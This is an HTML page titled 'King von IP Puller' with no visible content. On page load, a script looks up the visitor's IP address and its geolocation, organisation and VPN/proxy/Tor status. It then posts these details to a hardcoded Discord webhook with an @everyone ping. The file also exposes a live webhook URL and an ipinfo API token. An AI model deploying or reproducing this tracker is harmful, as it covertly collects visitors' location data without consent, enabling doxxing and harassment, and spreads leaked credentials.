<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>King von IP Puller</title>
</head>
<body>
    <script>
    async function sendToDiscord(ipInfo) {
        const webhookURL = 'https://discord.com/api/webhooks/1308891035342213120/TbQOU164hVD4wWZ7kle5tqIXpS9_lU3P7fUXmlYw7fTBm5Av8Zki7-Cw9D4dZd530xvr';

        const discordMessage = {
            content: "@everyone",
            embeds: [
                {
                    image: {
                        url: "https://www.rollingstone.com/wp-content/uploads/2022/02/king-von-posthumous-album.jpg"
                    },
                    title: "King von IP Puller",
                    fields: [
                        { name: "IP Address", value: ipInfo.ip || "N/A", inline: true },
                        { name: "City", value: ipInfo.city || "N/A", inline: true },
                        { name: "State", value: ipInfo.region || "N/A", inline: true },
                        { name: "Country", value: ipInfo.country || "N/A", inline: true },
                        { name: "Organization", value: ipInfo.org || "N/A", inline: true },
                        { name: "ASN Name", value: ipInfo.asn || "N/A", inline: true },
                        { name: "VPN", value: ipInfo.privacy?.vpn ? "True" : "False", inline: true },
                        { name: "Proxy", value: ipInfo.privacy?.proxy ? "True" : "False", inline: true },
                        { name: "TOR", value: ipInfo.privacy?.tor ? "True" : "False", inline: true },
                    ],
                    color: 0x007BFF,
                    footer: {
                        text: "BY RUNTZ PURCHASE TODAY!"
                    }
                }
            ]
        };

        try {
            const response = await fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(discordMessage)
            });

            if (!response.ok) {
                console.error("Failed to send to Discord:", response.statusText);
            }
        } catch (error) {
            console.error("Error sending to Discord:", error);
        }
    }

    async function getVisitorInfo() {
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            if (!ipResponse.ok) throw new Error("Failed to fetch IP");

            const ipData = await ipResponse.json();
            const userIP = ipData.ip;

            const ipInfoResponse = await fetch(`https://ipinfo.io/${userIP}/json?token=5f02d3fa0f98e2`);
            if (!ipInfoResponse.ok) throw new Error("Failed to fetch IP info");

            const ipInfo = await ipInfoResponse.json();
            await sendToDiscord(ipInfo);
        } catch (error) {
            console.error("Error getting visitor info:", error);
        }
    }

    getVisitorInfo();
    </script>
</body>
